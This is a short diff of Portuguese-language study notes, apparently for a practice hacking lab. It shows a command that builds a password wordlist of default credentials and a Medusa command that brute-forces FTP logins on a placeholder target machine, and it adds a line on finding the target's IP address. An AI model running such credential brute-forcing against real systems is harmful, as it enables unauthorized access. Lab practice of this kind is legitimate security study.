@@ -20,3 +20,7 @@ echo -e '123456\nmsfadmin\nadmin\nroot' > pass.txt
 COMANDO PARA USAR PARA TESTAR DIFERENTES USUARIOS E SENHAS:
 
 medusa -h IP_DA_MAQUINA_A_SER_INVADIDA -U users.txt -P pass.txt -M ftp -t 6
+
+# NO LINUX QUE VAI SER INVADIDO:
+
+ip a -> para descobir qual é o ip da máquina
